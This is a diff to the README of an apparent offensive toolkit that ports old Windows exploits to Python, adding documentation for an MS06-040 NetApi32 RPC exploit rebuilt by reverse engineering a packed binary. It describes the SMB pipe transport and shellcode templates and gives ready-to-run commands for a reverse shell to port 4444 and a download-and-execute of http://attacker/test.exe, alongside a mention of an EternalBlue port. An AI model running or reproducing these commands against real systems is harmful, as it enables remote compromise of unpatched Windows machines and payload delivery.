@@ -74,6 +74,34 @@ nsa-equation-py netapi32-exp 192.168.1.5 -r 192.168.1.9 -p 4444 -o 1    # revers
 nsa-equation-py netapi32-exp 192.168.1.5 -u http://attacker/test.exe -o 2 # download+exec
 ```
 
+### rpc-exp — MS06-040 (NetApi32 NetpwPathCanonicalize) RPC 利用 (v2 构建)
+
+Python rewrite of the **v2 / modified** build `ms06040rpc_unpacked_v2.exe`
+(memory-packed, OEP 0x4018F6; unpacked real logic recovered via IDA Pro +
+x32dbg memory dump).  It is the same Mika MS06-040 exploit family as
+`netapi32-exp`, with two differences recovered from the image:
+
+- the **BIND abstract syntax** is the BROWSER alias `6a281939-0cb1-11d0-9ba8-00c04fd92ef5`
+  (v0.0, UUID fields stored big-endian as printed — see `build_bind`),
+  instead of the original build's `4b324fc8-...` v3.0
+- the transport is **dependency-free**: a raw SMBv1 client (negotiate →
+  session setup → tree connect IPC$ → `NT_CREATE_ANDX` on `\BROWSER` →
+  `WRITE_ANDX`) whose frames were verified byte-for-byte against impacket's
+  serialisation.  It mirrors the C original's
+  `WNetAddConnection2A + CreateFileA + WriteFile` on
+  `\\host\pipe\BROWSER`.
+
+Everything else — the `NetpwPathCanonicalize` opcode 0x1F request bodies
+(`os_type 1` win2k 1152 B / `os_type 2` winxp 796 B), the reverse_tcp and
+download-exec shellcode templates, and the XOR-encoding scheme — is
+**byte-identical** to `netapi32-exp` (verified against the 0x407278 / 0x4076E4 /
+0x407030 / 0x407158 image regions).
+
+```bash
+nsa-equation-py rpc-exp 192.168.1.5 -r 192.168.1.9 -p 4444 -o 1    # reverse shell (v2)
+nsa-equation-py rpc-exp 192.168.1.5 -u http://attacker/test.exe -o 2 # download+exec (v2)
+```
+
 ### reternal-blue — MS17-010 (ETERNALBLUE) SMBv1 远程利用
 
 Python rewrite of the NSA EternalBlue exploit `Eternalblue-2.2.0.exe` (C++
